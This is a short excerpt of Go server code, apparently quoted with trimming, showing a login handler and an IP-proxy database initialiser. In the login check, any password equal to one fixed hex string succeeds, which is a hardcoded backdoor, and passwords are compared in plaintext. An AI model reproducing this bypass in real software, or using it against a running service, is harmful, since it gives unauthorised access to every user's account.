...
func (lh *LoginHandler) login(s *database.Socket) ([]byte, error) {
	...
	if strings.Compare(lh.password, user.Password) == 0 || lh.password == "1289EAEF66F47FA37C547E2049A8389A3F7D3648D95B1E1C921921407FC11F50" { // login succeeded
...
func InitIPdb() {
	var err error
	db, err = ip2proxy.OpenDB(ip2locationFile)
	if err != nil {
		return
	}
	log.Print("-----------------Initialize ip2location db----------------------")
